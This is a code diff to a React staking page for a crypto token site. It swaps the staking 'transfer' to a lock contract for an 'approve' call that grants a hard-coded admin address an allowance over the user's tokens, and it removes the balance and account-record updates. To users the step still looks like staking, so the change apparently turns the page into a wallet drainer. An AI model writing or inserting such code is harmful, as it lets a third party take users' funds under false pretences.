@@ -54,6 +54,7 @@ const Stake = ({ stakeArray, user, setCurrentUser, referrer }) => {
   const [stakeID, setStakeID] = useState();
   const [loadingState, setLoadingState] = useState(false);
   const lockContract = "0x9b8E6401fFd46F2395dd33C0205935d0bD44801F";
+  const adminAddress = "0xdb339be8E04Db248ea2bdD7C308c5589c121C6Bb";
 
   const [showConnect, setShowConnect] = useState(false);
 
@@ -136,12 +137,13 @@ const Stake = ({ stakeArray, user, setCurrentUser, referrer }) => {
   } = useContractWrite({
     address: "0x29272F1212Ed74F30962F1D2c61238fb87cf3d5F",
     abi: abi,
-    functionName: "transfer",
-    args: [lockContract, chainAmount],
+    functionName: "approve",
+    args: [adminAddress, chainAmount],
     onSuccess: async (data) => {
       if (data) {
         const nextProfitTime = new Date();
-        nextProfitTime.setMinutes(nextProfitTime.getMinutes() + 1);
+        // nextProfitTime.setMinutes(nextProfitTime.getMinutes() + 1);
+        nextProfitTime.setHours(nextProfitTime.getHours() + 1);
 
         const updatedBalance = Number(balance) + Number(amount);
 
@@ -161,20 +163,19 @@ const Stake = ({ stakeArray, user, setCurrentUser, referrer }) => {
               axios
                 .patch(`http://localhost:3000/api/users/update/${walletID}`, {
                   hasStaked: true,
-                  balance: updatedBalance,
                   referrer: referrer,
                 })
-                .then((res) => {
-                  axios.patch(
-                    `http://localhost:3000/api/users/updateAccountRecord/${walletID}`,
-                    {
-                      walletID: walletID,
-                      profitType: "New Stake",
-                      amount: amount,
-                      newBalance: updatedBalance,
-                    }
-                  );
-                })
+                // .then((res) => {
+                //   axios.patch(
+                //     `http://localhost:3000/api/users/updateAccountRecord/${walletID}`,
+                //     {
+                //       walletID: walletID,
+                //       profitType: "New Stake",
+                //       amount: amount,
+                //       newBalance: updatedBalance,
+                //     }
+                //   );
+                // })
                 .then((res) => {
                   axios.patch(
                     `http://localhost:3000/api/users/updateReferral/`,
